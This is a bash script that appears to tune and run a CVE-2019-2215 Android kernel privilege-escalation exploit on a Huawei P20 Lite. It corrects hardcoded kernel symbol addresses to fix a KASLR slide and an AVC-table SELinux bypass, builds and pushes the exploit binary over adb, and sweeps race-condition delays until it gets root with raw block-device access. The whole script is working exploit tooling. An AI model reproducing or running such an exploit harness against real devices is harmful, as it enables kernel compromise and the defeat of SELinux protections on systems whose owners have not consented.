#!/bin/bash
# Rebuild with the corrected kernel addresses and sweep the race delay finely.
#
# The two constants the exploit hardcodes are both wrong for this kernel:
#   FAIR_SCHED_CLASS  0xffffff8008f78408 -> 0xffffff8008f48408
#   AVC_CACHE         0xffffff800a2d4c40 -> 0xffffff800a276c40
# (read out of the 8.0.0.110(C635) KERNEL block's kallsyms via vmlinux-to-elf.)
# Because the two errors differ, the KASLR slide was off by -0x30000 and the AVC
# overwrite landed 0x2E000 past the real table - hence the SELinux bypass doing
# nothing at all.
#
# A rebuild shifts the race timing (the pristine binary wins, rebuilt ones have
# not), so this sweeps the runtime delay finely instead of trusting one value.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)

echo "############ 1. make sure both source patches are present"
python3 /home/placeless/dev/p20-root/fix_sources.py || true

echo
echo "############ 2. correct the two kernel addresses"
python3 - <<'PY'
import re
p='/home/placeless/dev/p20lite-cve/exploit/include/kernel_specific.h'
s=open(p).read()
s=s.replace('0xffffff8008f78408UL','0xffffff8008f48408UL')
s=s.replace('0xffffff8008f78408ul','0xffffff8008f48408ul')
s=s.replace('0xffffff800a2d4c40ul','0xffffff800a276c40ul')
open(p,'w').write(s)
print(s[s.find('#define KERNEL_BASE'):s.find('// likely to change')])
PY

echo
echo "############ 3. build and push"
"${NDK}ndk-build" -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2
ls -la libs/arm64-v8a/cve-2019-2215
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

echo
echo "############ 4. fine sweep - root AND block access"
DELAYS="3 5 8 10 12 15 18 20 22 25 28 30 33 35 38 40 45 50 55 60 70 80 90 100 120 140 160 200"
for D in $DELAYS; do
  for TRY in 1 2; do
    printf 'id\ncat /proc/self/attr/current\nblockdev --getsize64 /dev/block/bootdevice/by-name/nvme 2>&1\n' \
      | timeout 120 adb shell /data/local/tmp/cve-2019-2215 "$D" > "/tmp/fine_${D}_$TRY.out" 2>&1
    OUT=$(tr -d '\000' < "/tmp/fine_${D}_$TRY.out")
    if echo "$OUT" | grep -aq "uid=0(root)"; then
      if echo "$OUT" | grep -aq "denied"; then
        echo "  D=$D try=$TRY: root, but SELinux still denies"
      else
        echo "  >>>>>> D=$D try=$TRY: ROOT + BLOCK ACCESS <<<<<<"
        echo "$D" > /tmp/fine_winner.txt
        echo "$OUT" | tail -8
        exit 0
      fi
    else
      echo "  D=$D try=$TRY: no root"
    fi
  done
done
echo "no winning delay in this set"
